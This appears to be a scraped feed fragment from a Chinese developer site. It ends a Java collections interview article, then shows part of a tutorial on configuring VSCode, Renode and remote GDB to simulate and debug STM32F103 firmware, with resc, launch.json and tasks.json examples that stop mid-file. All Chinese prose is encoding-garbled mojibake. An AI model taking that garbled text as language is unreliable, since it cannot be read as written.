<li>JDK 1.8ï¼šæ•°ç»„ + é“¾è¡¨ + çº¢é»‘æ ‘ï¼Œé“¾è¡¨é•¿åº¦â‰¥8 ä¸”æ•°ç»„é•¿åº¦â‰¥64 æ—¶è½¬çº¢é»‘æ ‘ï¼Œå°¾æ’æ³•ï¼Œè§£å†³æˆç¯é—®é¢˜ï¼›</li>
<li>æ ¸å¿ƒï¼šé€šè¿‡ hashCode è®¡ç®—ç´¢å¼•ï¼Œequals åˆ¤æ–­é”®æ˜¯å¦ç›¸åŒï¼Œè´Ÿè½½å› å­ 0.75ï¼ˆå¹³è¡¡ç©ºé—´å’Œæ—¶é—´ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼šHashSet å’Œ HashMap çš„å…³ç³»ï¼ŸHashSet å¦‚ä½•ä¿è¯å…ƒç´ ä¸é‡å¤ï¼Ÿç­”ï¼šHashSet åº•å±‚æ˜¯ HashMapï¼ˆç”¨ HashMap çš„ key å­˜å…ƒç´ ï¼Œvalue å­˜å›ºå®šå¯¹è±¡ï¼‰ï¼›æ·»åŠ å…ƒç´ æ—¶ï¼Œå…ˆè®¡ç®— hashCodeï¼Œå†ç”¨ equals åˆ¤æ–­ï¼Œè‹¥å·²å­˜åœ¨åˆ™ä¸æ·»åŠ ï¼Œä¿è¯å”¯ä¸€æ€§ã€‚</p>
</li>
<li>
<p>é—®ï¼šé›†åˆçš„éå†æ–¹å¼æœ‰å“ªäº›ï¼Ÿå“ªç§æ•ˆç‡æœ€é«˜ï¼Ÿç­”ï¼š</p>
<ul>
<li>Listï¼šæ™®é€š forï¼ˆç´¢å¼•ï¼‰ã€å¢å¼º forã€è¿­ä»£å™¨ï¼ˆIteratorï¼‰ã€Streamï¼›</li>
<li>Mapï¼škeySet+getã€entrySetã€forEachï¼ˆJDK 8+ï¼‰ï¼›</li>
<li>æ•ˆç‡ï¼šArrayList ç”¨æ™®é€š for æœ€å¿«ï¼ŒLinkedList ç”¨è¿­ä»£å™¨ / å¢å¼º for æœ€å¿«ï¼›Map ç”¨ entrySet éå†æœ€å¿«ï¼ˆé¿å…å¤šæ¬¡ getï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h4 data-id="heading-11">3. ä¼ä¸šå®é™…åº”ç”¨åœºæ™¯</h4>
<ol>
<li><strong>æ•°æ®å­˜å‚¨</strong>ï¼šæ¥å£è¿”å›åˆ—è¡¨ï¼ˆå¦‚ç”¨æˆ·åˆ—è¡¨ã€è®¢å•åˆ—è¡¨ï¼‰ç”¨<code>List</code>ï¼›å»é‡æ•°æ®ï¼ˆå¦‚å•†å“æ ‡ç­¾ã€ç”¨æˆ· IDï¼‰ç”¨<code>HashSet</code>ï¼›é”®å€¼å¯¹æ•°æ®ï¼ˆå¦‚ç”¨æˆ· IDâ†’ç”¨æˆ·ä¿¡æ¯ï¼‰ç”¨<code>HashMap</code>ã€‚</li>
<li><strong>ç¼“å­˜å®ç°</strong>ï¼šæœ¬åœ°ç¼“å­˜ï¼ˆå¦‚åŠ è½½å­—å…¸æ•°æ®ï¼‰ç”¨<code>HashMap</code>ï¼Œæœ‰åºç¼“å­˜ç”¨<code>TreeMap</code>ã€‚</li>
<li><strong>æ•°æ®å¤„ç†</strong>ï¼šæ‰¹é‡æ•°æ®ç­›é€‰ï¼ˆå¦‚ç­›é€‰æœªæ”¯ä»˜è®¢å•ï¼‰ã€èšåˆï¼ˆå¦‚ç»Ÿè®¡å„éƒ¨é—¨äººæ•°ï¼‰ç”¨ Stream æµã€‚</li>
<li><strong>å¹¶å‘åœºæ™¯</strong>ï¼šé«˜å¹¶å‘ä¸‹ç”¨<code>ConcurrentHashMap</code>ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰æ›¿ä»£<code>HashMap</code>ï¼Œç”¨<code>CopyOnWriteArrayList</code>æ›¿ä»£<code>ArrayList</code>ã€‚</li>
</ol>
<h3 data-id="heading-12">æ€»ç»“</h3>
<ol>
<li><strong>å¼‚å¸¸</strong>ï¼šæ ¸å¿ƒæ˜¯åŒºåˆ†ç¼–è¯‘æ—¶ / è¿è¡Œæ—¶å¼‚å¸¸ï¼Œä¼ä¸šä¸­è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸ + å…¨å±€ç»Ÿä¸€å¤„ç†ï¼Œé¿å…ç¨‹åºå´©æºƒå’Œä¿¡æ¯æ³„éœ²ã€‚</li>
<li><strong>æ³›å‹</strong>ï¼šè§£å†³ç±»å‹å®‰å…¨å’Œä»£ç å¤ç”¨é—®é¢˜ï¼Œæ˜¯é›†åˆã€æ¡†æ¶çš„åŸºç¡€ï¼Œé‡ç‚¹æŒæ¡æ³›å‹ç±» / æ–¹æ³•å’Œé€šé…ç¬¦çš„ä½¿ç”¨ã€‚</li>
<li><strong>é›†åˆ</strong>ï¼šä¼ä¸šå¼€å‘é«˜é¢‘ä½¿ç”¨ï¼Œæ ¸å¿ƒæ˜¯æ ¹æ®ä¸šåŠ¡åœºæ™¯é€‰å‹ï¼ˆArrayList/HashMap ä¸ºé¦–é€‰ï¼‰ï¼ŒæŒæ¡åº•å±‚åŸç†å’Œé«˜æ•ˆéå†æ–¹å¼ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VSCode + Renodeï¼šæ‰“é€ ç°ä»£åŒ–çš„åµŒå…¥å¼ä»¿çœŸå¼€å‘ç¯]]></title>    <link>https://juejin.cn/post/7580988382761091087</link>    <guid>https://juejin.cn/post/7580988382761091087</guid>    <pubDate>2025-12-08T04:28:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580988382761091087" data-draft-id="7580988382761009167" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VSCode + Renodeï¼šæ‰“é€ ç°ä»£åŒ–çš„åµŒå…¥å¼ä»¿çœŸå¼€å‘ç¯"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2025-12-08T04:28:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="11cookies11"/> <meta itemprop="url" content="https://juejin.cn/user/1259367703787244"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VSCode + Renodeï¼šæ‰“é€ ç°ä»£åŒ–çš„åµŒå…¥å¼ä»¿çœŸå¼€å‘ç¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1259367703787244/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    11cookies11
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:28:47.000Z" title="Mon Dec 08 2025 04:28:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä¼ ç»Ÿçš„åµŒå…¥å¼å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦ä¾èµ–å®ä½“å¼€å‘æ¿ã€ä»¿çœŸå™¨ï¼ˆST-Link/J-Linkï¼‰ã€å„ç§é©±åŠ¨ã€å¤æ‚çš„ IDEï¼ˆå¦‚ IARã€Keilï¼‰ï¼Œä¸ä»…ç¯å¢ƒæ­å»ºç¹çï¼Œè¿˜ä¼šå—åˆ°ç¡¬ä»¶æ•°é‡ã€æ¡ä»¶ã€æµ‹è¯•é£é™©çš„é™åˆ¶ã€‚</p>
<p>ä½†éšç€ <strong>Renodeï¼ˆAntmicroï¼‰</strong> çš„æˆç†Ÿï¼Œç°åœ¨æˆ‘ä»¬ç»ˆäºå¯ä»¥ï¼š</p>
<ul>
<li>ä½¿ç”¨ <strong>VSCode + GCC</strong> åšç°ä»£åŒ–çš„ç¼–è¾‘ä½“éªŒ</li>
<li>ä½¿ç”¨ <strong>Renode</strong> æ¨¡æ‹Ÿ **CPU + å¤–è®¾ **</li>
<li>ä½¿ç”¨ <strong>GDB Server</strong> å®ç°è°ƒè¯•</li>
<li>ç”šè‡³å¯ä»¥åœ¨æœåŠ¡å™¨ï¼ˆæ ‘è“æ´¾/OrangePiï¼‰ä¸Šè¿œç¨‹è·‘ Renode</li>
</ul>
<p>è¿‡å»å‡ å¤©ï¼Œæˆ‘ä¸€æ­¥æ­¥æ­å¥½äº†ä» VSCode â†’ Renode â†’ GDB çš„å®Œæ•´é“¾è·¯ï¼Œå¹¶è§£å†³äº†ä¸€å †å‘ã€‚  è¿™ç¯‡æ–‡ç« è®°å½•å®Œæ•´çš„æµç¨‹ã€å…³é”®é…ç½®ã€å¸¸è§é”™è¯¯ä¸è§£å†³æ–¹å¼ã€‚</p>
<h3 data-id="heading-0">ğŸ“Œ ä¸€ã€ä¸ºä»€ä¹ˆé€‰æ‹© Renode + VSCodeï¼Ÿ</h3>
<p>ç°ä»£åµŒå…¥å¼å¼€å‘å·²ç»ä»è¿™æ ·çš„æ–¹å¼ï¼š</p>
<p>âŒ IAR + å®ç‰©æ¿å­ + çƒ§å½•å™¨ + ä¸²å£çº¿ + ç¡¬ä»¶ä¾èµ–  âŒ è°ƒè¯•æ–­ç‚¹å’Œæ­¥è¿›å®Œå…¨ä¾èµ–ç‰©ç†æ¿å­  âŒ ä¸€ä¸ªèŠ¯ç‰‡æ¢å¹³å°å°±è¦é‡è£…ä¸€å †ä¸œè¥¿</p>
<p>é€æ¸èµ°å‘ï¼š</p>
<p>âœ” VSCode + GCCï¼šè½»é‡ç°ä»£åŒ–å¼€å‘ä½“éªŒ  âœ” Renodeï¼šæ¨¡æ‹Ÿ STM32/ESP32 ç­‰è®¾å¤‡ï¼ŒåŒ…å« UARTã€SPIã€I2Cã€GPIOã€DMA  âœ” GDB Remoteï¼šè·¨å¹³å°ã€å¯è¿œç¨‹è°ƒè¯•  âœ” è‡ªåŠ¨åŒ–ã€å¯è„šæœ¬åŒ–</p>
<p>è¿™å¥—æ–¹å¼åœ¨å›½å¤–å…¬å¸éå¸¸å¸¸è§ï¼ŒåŸå› æ˜¯ï¼š</p>
<ul>
<li>æ›´é«˜çš„å¼€å‘æ•ˆç‡</li>
<li>æµ‹è¯•å¯è‡ªåŠ¨åŒ–</li>
<li>CI/CD å¯è·‘ä»¿çœŸ</li>
<li>å¯¹ç¡¬ä»¶ä¾èµ–æ›´ä½</li>
</ul>
<p>è€Œåœ¨å›½å†…è¿˜ä¸å¤ªæ™®åŠï¼Œæ‰€ä»¥æˆ‘è‡ªå·±å®è·µåå†™ä¸‹è¿™ç¯‡æ–‡ç« ï¼Œå¸Œæœ›å¸®åŠ©æ›´å¤šäººã€‚</p>
<p>æ­¥éª¤ï¼š</p>
<ol>
<li>å®‰è£…Renode</li>
<li>é…ç½®Renode(ç¼–è¾‘Renodeçš„è„šæœ¬)</li>
<li>é…ç½®VScode(.vscode/tasks.josn/.vscode/launch.josn)</li>
<li>æµ‹è¯•</li>
</ol>
<p>ç›®æ ‡ï¼š</p>
<ol>
<li>å®ç°ç¼–å†™ä»£ç æ§åˆ¶renodeæ¨¡æ‹Ÿå¤–è®¾å·¥ä½œ</li>
<li>å¯ä»¥ä½¿ç”¨vscodeé…åˆrenodeå¯¹ä»£ç è¿›è¡Œä»¿çœŸ</li>
</ol>
<h3 data-id="heading-1">ğŸ“Œ äºŒã€å®‰è£… Renode</h3>
<p>Renode æä¾›å¤šä¸ªç‰ˆæœ¬ï¼Œä½ åªéœ€è¦é€‰ä¸€ä¸ªèƒ½è·‘çš„ï¼š</p>
<p>èµ„æºä¸‹è½½ï¼š[Renodeçš„githubä»“åº“](<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frenode%2Frenode" target="_blank" title="https://github.com/renode/renode" ref="nofollow noopener noreferrer">renode/renode: Renode - Antmicroâ€™s open source simulation and virtual development framework for complex embedded systems</a>)</p>
<h3 data-id="heading-2">æˆ‘çš„é€‰æ‹©ï¼š</h3>
<pre><code class="hljs">renode-latest.linux-portable-dotnet.tar.gz
</code></pre>
<p>ç†ç”±ï¼š</p>
<ul>
<li>è‡ªå¸¦ dotnet runtime</li>
<li>ä¸ä¾èµ–ç³»ç»Ÿçš„ dotnet/mono</li>
<li>å¯åœ¨ OrangePi / Raspberry Pi ä¸Šè¿è¡Œ</li>
</ul>
<p>è§£å‹åç›´æ¥è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">./renode
</code></pre>
<h3 data-id="heading-3">ğŸ“Œ ä¸‰ã€é…ç½®Renode</h3>
<p>å†™ä¸€ä¸ªæœ€åŸºç¡€çš„Renode.rescæ–‡ä»¶(STM32F103)ï¼Œè¿™ä¸ªRenode.rescç›¸å½“äºä½ è¦æ¨¡æ‹ŸMCUçš„é…ç½®è¡¨ï¼ŒRenodeåŠ è½½è¿™ä¸ª.rescï¼Œæ¨¡æ‹Ÿå‡ºä½ æƒ³è¦çš„ç¯å¢ƒ</p>
<p>è¿™æ˜¯æˆ‘æœ€ç»ˆå¯è¿è¡Œçš„ç‰ˆæœ¬ï¼ˆå¯ç›´æ¥ç”¨ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">using sysbus

mach create <span class="hljs-string">"stm32f103"</span>
machine LoadPlatformDescription @platforms/cpus/stm32f103.repl

<span class="hljs-comment"># åŠ è½½å›ºä»¶ï¼ŒrenodeåŠ è½½orangepiä¸Š.elfæ–‡ä»¶</span>
machine LoadELF @/home/orangepi/object/renode_portable/firmware.elf

<span class="hljs-comment"># æ‰“å¼€ UART2</span>
showAnalyzer sysbus.usart2

<span class="hljs-comment"># å¼€ GDB æœåŠ¡ï¼ˆç«¯å£ 3333ï¼‰ï¼Œè®©vscodeå¯ä»¥ä½¿ç”¨GDBé…åˆrenodeå®ç°å¯è§†åŒ–debug</span>
machine StartGdbServer 3333 <span class="hljs-literal">true</span>


start
</code></pre>
<p>ä½ å¯ä»¥æŠŠå®ƒä¿å­˜ä¸ºï¼š</p>
<pre><code class="hljs">run_stm32.resc
</code></pre>
<h3 data-id="heading-4">ğŸ“Œ å››ã€VSCode è°ƒè¯•é…ç½®</h3>
<p>é…ç½®<strong>launch.json</strong>ï¼Œè¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ã€‚</p>
<p>ç›´æ¥è´´å¯è¿è¡Œç‰ˆæœ¬ï¼ˆé€‚ç”¨äº ARM Cortex-M3 / STM32F1ï¼‰ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">{
    <span class="hljs-string">"version"</span>: <span class="hljs-string">"0.2.0"</span>,
    <span class="hljs-string">"configurations"</span>: [
        {
            <span class="hljs-string">"name"</span>: <span class="hljs-string">"Debug STM32F103 on Renode Remote"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"cppdbg"</span>,
            <span class="hljs-string">"request"</span>: <span class="hljs-string">"launch"</span>,

            <span class="hljs-string">"program"</span>: <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/build/firmware.elf"</span>,
            <span class="hljs-string">"cwd"</span>: <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>"</span>,

            <span class="hljs-string">"miDebuggerPath"</span>: <span class="hljs-string">"arm-none-eabi-gdb"</span>,
            <span class="hljs-string">"miDebuggerServerAddress"</span>: <span class="hljs-string">"xxx.xxx.xxx.xxx:3333"</span>,

            <span class="hljs-string">"preLaunchTask"</span>: <span class="hljs-string">"Run Renode Remote"</span>,

            <span class="hljs-string">"stopAtEntry"</span>: <span class="hljs-literal">true</span>,

            <span class="hljs-string">"setupCommands"</span>: [
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"set pagination off"</span> },
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"set confirm off"</span> },
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"set print pretty on"</span> }
            ],

            <span class="hljs-comment">/* On restart: pause, reload ELF, reset CPU (mimic your manual sequence) */</span>
            <span class="hljs-string">"postRemoteConnectCommands"</span>: [
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"monitor machine Pause"</span> },
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"monitor sysbus LoadELF @/home/orangepi/object/renode_portable/firmware.elf"</span> },
                { <span class="hljs-string">"text"</span>: <span class="hljs-string">"monitor cpu Reset"</span> }
            ],

            <span class="hljs-string">"externalConsole"</span>: <span class="hljs-literal">false</span>,

            <span class="hljs-string">"targetArchitecture"</span>: <span class="hljs-string">"arm"</span>
        }
    ]
}
</code></pre>
<p>æ ¸å¿ƒç‚¹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"miDebuggerPath"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"arm-none-eabi-gdb"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"miDebuggerServerAddress"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"xxx.xxx.xxx.xxx:3333"</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>è§£é‡Šï¼š</p>
<ul>
<li>miDebuggerPathï¼šæœ¬æœºè¦ä½¿ç”¨çš„ GDBï¼ˆä½ ç”µè„‘ä¸Šå®‰è£…çš„ï¼‰</li>
<li>miDebuggerServerAddressï¼šè¿œç«¯ Renode çš„ GDB server ç›‘å¬åœ°å€</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"preLaunchTask"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Run Renode Remote"</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>VSCode ä¼šå…ˆæ‰§è¡Œåç§°ä¸º "Run Renode Remote" çš„ä»»åŠ¡ï¼ˆåœ¨ tasks.json é‡Œï¼‰ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"postRemoteConnectCommands"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"monitor machine Pause"</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"monitor sysbus LoadELF @/home/orangepi/object/renode_portable/firmware.elf"</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"monitor cpu Reset"</span> <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>è¿™æ˜¯æ•´ä¸ªè°ƒè¯•æµç¨‹çš„çµé­‚ã€‚</p>
<p>é€å¥è§£é‡Šï¼š</p>
<h3 data-id="heading-5">â‘  æš‚åœä»¿çœŸ</h3>
<pre><code class="hljs language-css" lang="css">monitor machine <span class="hljs-attribute">Pause</span>
</code></pre>
<p>é˜²æ­¢ Renode ç»§ç»­è¿è¡Œæ—§å›ºä»¶ã€‚</p>
<h3 data-id="heading-6">â‘¡ åœ¨ Renode å†…é‡æ–°åŠ è½½ ELF</h3>
<pre><code class="hljs language-arduino" lang="arduino">monitor sysbus LoadELF @/home/orangepi/object/renode_portable/firmware.elf
</code></pre>
<p>åŸå› ï¼š</p>
<ul>
<li>VSCode æ¯æ¬¡ build å®Œæˆæœ¬åœ°æœ‰ä¸€ä¸ª ${workspaceFolder}/build/firmware.elf</li>
<li>ä½†æ˜¯è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ ELF é€šå¸¸åœ¨å¦ä¸€ä¸ªç›®å½•ï¼Œæ¯”å¦‚ /home/orangepi/object/...</li>
<li>é‡æ–°åŠ è½½ ELF å¯ä»¥è®© Renode ä¸æœ€æ–°ç¬¦å·ä¸€è‡´</li>
</ul>
<p>è¿™æ˜¯ <strong>â€œæœ¬åœ° build â†’ scp â†’ è¿œç«¯è‡ªåŠ¨åŠ è½½â€</strong> çš„æœºåˆ¶ã€‚</p>
<h3 data-id="heading-7">â‘¢ é‡ç½® CPUï¼ˆç±»ä¼¼ reset haltï¼‰</h3>
<pre><code class="hljs">monitor cpu Reset
</code></pre>
<p>ç›¸å½“äºï¼š</p>
<ul>
<li>ç¨‹åºä»å¤´å¼€å§‹è¿è¡Œ</li>
<li>ä¸‹ä¸€æ­¥ VSCode ä¼šåœåœ¨ main()</li>
</ul>
<p>è¿™ä¸ªåºåˆ—ç›¸å½“äºæ¨¡æ‹Ÿ FreeRTOS ä¸­çš„ debug resetã€‚</p>
<p><strong>Tasks.jsoné…ç½®</strong></p>
<p>å‡ºäº†launch.json,è¿˜æœ‰tasks.jsonéœ€è¦é…ç½®ï¼Œé…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">{
    <span class="hljs-string">"version"</span>: <span class="hljs-string">"2.0.0"</span>,
    <span class="hljs-string">"tasks"</span>: [

        <span class="hljs-regexp">/* === 1. CMake Configure === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"CMake Configure"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"cmake"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"-S"</span>, <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>"</span>,
                <span class="hljs-string">"-B"</span>, <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/build"</span>,
                <span class="hljs-string">"-DCMAKE_BUILD_TYPE=Debug"</span>
            ],
            <span class="hljs-string">"problemMatcher"</span>: [<span class="hljs-string">"$gcc"</span>]
        },

        <span class="hljs-regexp">/* === 2. CMake Build === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"CMake Build"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"cmake"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"--build"</span>, <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/build"</span>,
                <span class="hljs-string">"--config"</span>, <span class="hljs-string">"Debug"</span>
            ],
            <span class="hljs-string">"dependsOn"</span>: [<span class="hljs-string">"CMake Configure"</span>],
            <span class="hljs-string">"problemMatcher"</span>: [<span class="hljs-string">"$gcc"</span>]
        },

        <span class="hljs-regexp">/* === 3. ä¸Šä¼  ELF === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"Upload ELF"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"scp"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/build/firmware.elf"</span>,
                <span class="hljs-string">"root@192.168.31.135:/home/orangepi/object/renode_portable/"</span>
            ],
            <span class="hljs-string">"dependsOn"</span>: [<span class="hljs-string">"CMake Build"</span>],
            <span class="hljs-string">"problemMatcher"</span>: []
        },

        <span class="hljs-regexp">/* === 4. ä¸Šä¼  RESC === */</span>
        {
            <span class="hljs-string">"label"</span>: <span class="hljs-string">"Upload RESC"</span>,
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"shell"</span>,
            <span class="hljs-string">"command"</span>: <span class="hljs-string">"scp"</span>,
            <span class="hljs-string">"args"</span>: [
                <span class="hljs-string">"<span class="hljs-subst">${workspaceFolder}</span>/renode/platform.resc"</span>,
                <span class="hljs-string">"root@xxx.xxx.xxx.xxx:/home/orangepi/object/renode_portable/"</span>
            ],
            <span class="hljs-string">"problemMatcher"</span>: []
        },

